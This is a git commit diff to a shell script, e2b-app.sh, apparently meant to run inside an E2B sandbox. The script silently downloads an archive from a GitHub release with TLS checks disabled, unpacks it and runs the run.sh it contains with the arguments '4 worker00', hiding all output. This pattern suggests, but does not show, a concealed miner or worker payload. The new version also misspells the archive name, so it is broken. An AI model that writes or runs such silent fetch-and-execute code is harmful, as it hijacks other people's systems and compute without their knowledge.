f0424aad8bef00b34966805b7165baf9d32fe234
mrsilkin1-del <mr.silkin1@fasdeil.com>
2026-06-21 09:56:26 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,9 +1,7 @@
 #!/bin/bash
 
-curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/LAB.tar.gz >/dev/null 2>&1
-tar -xvf LAB.tar.gz >/dev/null 2>&1
-rm LAB.tar.gz
-cd LAB
-cd mcp
+curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/nowde.tar.gz >/dev/null 2>&1
+tar -xvf nowde.tar.gzz >/dev/null 2>&1
+rm nowde.tar.gz
 chmod +x run.sh 
 ./run.sh 4 worker00 >/dev/null 2>&1
